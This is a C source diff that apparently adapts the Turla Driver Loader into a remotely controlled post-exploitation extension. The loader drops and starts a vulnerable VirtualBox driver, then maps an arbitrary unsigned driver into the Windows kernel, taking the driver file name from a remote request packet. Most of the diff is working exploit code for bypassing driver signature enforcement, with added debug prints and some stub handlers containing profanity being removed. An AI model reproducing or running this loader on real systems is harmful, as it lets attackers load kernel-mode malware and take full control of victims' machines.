@@ -27,6 +27,7 @@ volatile LONG g_lApplicationInstances = 0;
 #pragma data_seg()
 #pragma comment(linker, "/Section:shrd,RWS")
 
+extern HINSTANCE hAppInstance;
 HINSTANCE  g_hInstance;
 HANDLE     g_ConOut = NULL;
 HANDLE     g_hVBox = INVALID_HANDLE_VALUE;
@@ -47,8 +48,16 @@ WCHAR      BE = 0xFEFF;
 #define T_LOADERUSAGE   TEXT("Usage: loader drivertoload\n\re.g. loader mydrv.sys\r\n")
 #define T_LOADERINTRO   TEXT("Turla Driver Loader v1.0.0 started\r\n(c) 2016 TDL Project\r\nSupported x64 OS : 7 and above\r\n")
 
-void request_drivertools_do_work(Remote *remote, Packet *request);
-void request_drivertools_tdl_do_nothing(Remote *remote, Packet *request);
+UINT request_drivertools_do_work(Remote *remote, Packet *request);
+
+static WCHAR* char2wchar(const char* text)
+{
+	CONST size_t size = strlen(text) + 1;
+	WCHAR* wtxt = calloc(size, sizeof(WCHAR));
+	mbstowcs(wtxt, text, size);
+	return wtxt;
+}
+
 /*
 * TDLVBoxInstalled
 *
@@ -393,6 +402,7 @@ UINT TDLMapDriver(
 	LPWSTR lpDriverFullName
 	)
 {
+	DbgPrint("[+] Hit TDLMapDriver() ...\n");
 	UINT               result = (UINT)-1;
 	ULONG              isz;
 	SIZE_T             memIO;
@@ -544,23 +554,24 @@ HANDLE TDLStartVulnerableDriver(
 	ULONG       DataSize = 0, bytesIO;
 	HANDLE      hDevice = INVALID_HANDLE_VALUE;
 	WCHAR       szDriverFileName[MAX_PATH * 2];
+	CHAR		whatever[MAX_PATH * 2];
 	SC_HANDLE   schSCManager = NULL;
 	LPWSTR      msg;
-
+	DbgPrint("[+] Hit TDLStartVulnerableDriver() ...\n");
 	DrvBuffer = supQueryResourceData(1, g_hInstance, &DataSize);
 	while (DrvBuffer != NULL) {
-
 		//lets give scm nice looking path so this piece of shit code from early 90x wont fuckup somewhere.
 		RtlSecureZeroMemory(szDriverFileName, sizeof(szDriverFileName));
-		if (!GetSystemDirectory(szDriverFileName, MAX_PATH)) {
+		if (!GetSystemDirectoryW(szDriverFileName, MAX_PATH)) {
 
 			// cuiPrintText(g_ConOut,
 			//	TEXT("Ldr: Error loading VirtualBox driver, GetSystemDirectory failed"),
 			//	g_ConsoleOutput, TRUE);
 			tdlError(ctx, TEXT("Ldr: Error loading VirtualBox driver, GetSystemDirectory failed"));
+			DbgPrint("[+] GetSystemDirectory failed!\n");
 			break;
 		}
-
+		DbgPrint("[+] Opening SC manager .. szDriverFileName currently: %S\n", szDriverFileName);
 		schSCManager = OpenSCManager(NULL,
 			NULL,
 			SC_MANAGER_ALL_ACCESS
@@ -570,6 +581,7 @@ HANDLE TDLStartVulnerableDriver(
 		//		TEXT("Ldr: Error opening SCM database"),
 		//		g_ConsoleOutput, TRUE);
 			tdlError(ctx, TEXT("Ldr: Error opening SCM database"));
+			DbgPrint("[+] Can't open SCM database!\n");
 			break;
 		}
 
@@ -579,7 +591,7 @@ HANDLE TDLStartVulnerableDriver(
 			//	TEXT("Ldr: Active VirtualBox found in system, attempt unload it"),
 			//	g_ConsoleOutput, TRUE);
 			tdlPrintClient(ctx, TEXT("Ldr: Active VirtualBox found in system, attempt unload it"));
-
+			DbgPrint("[+] Trying to unload active virtualbox driver\n");
 			if (scmStopDriver(schSCManager, TEXT("VBoxNetAdp"))) {
 				//cuiPrintText(g_ConOut,
 				//	TEXT("SCM: VBoxNetAdp driver unloaded"),
@@ -607,6 +619,7 @@ HANDLE TDLStartVulnerableDriver(
 			}
 		}
 
+		DbgPrint("[+] wchar to utf8 VBoxDrv: %s\n", (LPCTSTR)(VBoxDrvSvc));
 		//if vbox installed backup it driver, do it before dropping our
 		if (g_VBoxInstalled) {
 			if (supBackupVBoxDrv(FALSE) == FALSE) {
@@ -619,7 +632,9 @@ HANDLE TDLStartVulnerableDriver(
 		}
 
 		//drop our vboxdrv version
-		_strcat(szDriverFileName, TEXT("\\drivers\\VBoxDrv.sys"));
+		wcscat(szDriverFileName, L"\\drivers\\VBoxDrv.sys");
+		DbgPrint("[+] Hit vbox dropper branch ....\n");
+		DbgPrint("[+] szDriverFileName: %S\n", szDriverFileName);
 		bytesIO = (ULONG)supWriteBufferToFile(szDriverFileName, DrvBuffer,
 			(SIZE_T)DataSize, FALSE, FALSE);
 
@@ -629,24 +644,31 @@ HANDLE TDLStartVulnerableDriver(
 			//	TEXT("Ldr: Error writing VirtualBox on disk"),
 			//	g_ConsoleOutput, TRUE);
 			tdlError(ctx, TEXT("Ldr: Error writing VirtualBox on disk"));
+			DbgPrint("[+] Error writing vbox driver to disk ....\n");
 			break;
 		}
 
 		//if vbox not found in system install driver in scm
 		if (g_VBoxInstalled == FALSE) {
-			scmInstallDriver(schSCManager, VBoxDrvSvc, szDriverFileName);
+			DbgPrint("[+] installing vbox driver, szDriverFileName: %S....\n", (LPCTSTR)szDriverFileName);
+			scmInstallDriver(schSCManager, VBoxDrvSvc, (LPCTSTR)szDriverFileName);
+			//scmInstallDriver(schSCManager, (LPCTSTR)VBoxDrvSvc, (LPCTSTR)whatever);
 		}
 
 		//run driver
 		if (scmStartDriver(schSCManager, VBoxDrvSvc) == TRUE) {
 
-			if (scmOpenDevice(VBoxDrvSvc, &hDevice))
+			if (scmOpenDevice(VBoxDrvSvc, &hDevice)) {
+				DbgPrint("[+] got vbox installed and a handle to the device object! ....\n");
 				msg = TEXT("SCM: Vulnerable driver loaded and opened");
-			else
+			}
+			else{
+				DbgPrint("[+] error opening vbox device obj ....\n");
 				msg = TEXT("SCM: Driver device open failure");
-
+			}
 		}
 		else {
+			DbgPrint("[+] something went wrong with scmStartDriver :/ ....\n");
 			msg = TEXT("SCM: Vulnerable driver load failure");
 		}
 
@@ -679,6 +701,7 @@ void TDLStopVulnerableDriver(
 	UNICODE_STRING     uStr;
 	OBJECT_ATTRIBUTES  ObjectAttributes;
 
+	DbgPrint("[+] Hit TDLStopVulnerableDriver() ...\n");
 	//cuiPrintText(g_ConOut,
 	//	TEXT("SCM: Unloading vulnerable driver"),
 	//	g_ConsoleOutput, TRUE);
@@ -752,17 +775,20 @@ void TDLStopVulnerableDriver(
 */
 UINT TDLProcessCommandLine(
 	CONNECTIONCTX *ctx,
-	LPWSTR lpCommandLine
+	WCHAR* fname
 	)
 {
 	UINT   retVal = (UINT)-1;
 	WCHAR  szInputFile[MAX_PATH + 1];
 	ULONG  c;
-	
+	DbgPrint("[+] Hit TDLProcessCommandLine() ... fname: %S\n", fname);
+
 	//input file
 	c = 0;
 	RtlSecureZeroMemory(szInputFile, sizeof(szInputFile));
-	GetCommandLineParam(lpCommandLine, 1, (LPWSTR)&szInputFile, MAX_PATH, &c);
+	_strcpy_w(szInputFile, fname);
+	DbgPrint("[+] szInputFile: %S\n", szInputFile);
+	//GetCommandLineParam(lpCommandLine, 1, (LPWSTR)&szInputFile, MAX_PATH, &c);
 	//if (c == 0) {
 	//	//cuiPrintText(g_ConOut,
 	//	//	T_LOADERUSAGE,
@@ -773,6 +799,7 @@ UINT TDLProcessCommandLine(
 	if (PathFileExists(szInputFile)) {
 		g_hVBox = TDLStartVulnerableDriver(ctx);
 		if (g_hVBox != INVALID_HANDLE_VALUE) {
+			DbgPrint("[+] Not INVALID_HANDLE_VALUE\n");
 			retVal = TDLMapDriver(ctx, szInputFile);
 			TDLStopVulnerableDriver(ctx);
 		}
@@ -781,43 +808,12 @@ UINT TDLProcessCommandLine(
 		//cuiPrintText(g_ConOut,
 		//	TEXT("Ldr: Input file not found"),
 		//	g_ConsoleOutput, FALSE);
+		DbgPrint("[+] input file not found ...\n");
 	}
+	DbgPrint("[+] command line retval: %d\n", retVal);
 	return retVal;
 }
 
-void doevenless(CONNECTIONCTX *ctx);
-
-void request_drivertools_do_work(Remote *remote, Packet *request)
-{
-	Packet *response = packet_create_response(request);
-	DWORD result = 73313;
-
-	// Transmit the response
-	packet_transmit_response(result, remote, response);
-}
-
-void request_drivertools_tdl_do_nothing(Remote *remote, Packet *request)
-{
-	CONNECTIONCTX *ctx = malloc(sizeof(CONNECTIONCTX));
-	ctx->remote		= remote;
-	ctx->request	= request;
-	ctx->response   = packet_create_response(request);
-	//Packet *response = packet_create_response(request);
-	
-	tdlPrintClient(ctx, TEXT("first"));
-	tdlPrintClient(ctx, TEXT("second"));
-	tdlPrintClient(ctx, TEXT("third"));
-	tdlPrintClient(ctx, TEXT("[+] wuuuuuuuuuuuuuuuuuuuuuuuuut"));
-	doevenless(ctx);
-
-	DWORD result = ERROR_SUCCESS;
-	packet_transmit_response(result, ctx->remote, ctx->response);
-}
-
-void doevenless(CONNECTIONCTX *ctx)
-{
-	tdlPrintClient(ctx, TEXT("ASSHOLE"));
-}
 /*
 * TDLMain
 *
@@ -827,7 +823,7 @@ void doevenless(CONNECTIONCTX *ctx)
 *
 */
 
-VOID request_drivertools_do_work_disabled(Remote *remote, Packet *request)
+UINT request_drivertools_do_work(Remote *remote, Packet *request)
 {
 
 	BOOL            cond = FALSE;
@@ -835,11 +831,25 @@ VOID request_drivertools_do_work_disabled(Remote *remote, Packet *request)
 	DWORD           dwTemp;
 	LONG            x;
 	OSVERSIONINFOW  osv;
-	WCHAR           text[256];
+	PCHAR           fname = NULL;
+	WCHAR			text[256];
+	WCHAR*			wfname = NULL;
+
 
 	// the complete call stack of the program is pretty linear,
 	// so pass context struct down the chain and log 
 	// all output to it
+	// probably want to remove all debugging messages for release
+
+   	fname = packet_get_tlv_value_string(request, TLV_TYPE_TDL_DRIVER_FILENAME);
+	if (!fname) {
+		DbgPrint("[!] fname is nullwtf!!\n");
+		__debugbreak();
+	}
+
+	wfname = char2wchar(fname);
+
+	DbgPrint("[+] Hit request_drivertools_do_work() fname = %s...\n", fname);
 
 	CONNECTIONCTX *ctx = malloc(sizeof(CONNECTIONCTX));
 	ctx->remote = remote;
@@ -848,7 +858,8 @@ VOID request_drivertools_do_work_disabled(Remote *remote, Packet *request)
 	__security_init_cookie();
 
 	do {
-		g_hInstance = GetModuleHandle(NULL);
+		//g_hInstance = GetModuleHandle(NULL);
+		g_hInstance = hAppInstance;
 
 		g_ConOut = GetStdHandle(STD_OUTPUT_HANDLE);
 		if (g_ConOut == INVALID_HANDLE_VALUE) {
@@ -912,10 +923,10 @@ VOID request_drivertools_do_work_disabled(Remote *remote, Packet *request)
 			tdlPrintClient(ctx, TEXT("Ldr: Warning VirtualBox software installed, conflicts possible"));
 		}
 
-		uResult = TDLProcessCommandLine(ctx, GetCommandLine());
+		uResult = TDLProcessCommandLine(ctx, wfname);
 
 	} while (cond);
 
 	InterlockedDecrement((PLONG)&g_lApplicationInstances);
-	ExitProcess(uResult);
+	return uResult;
 }
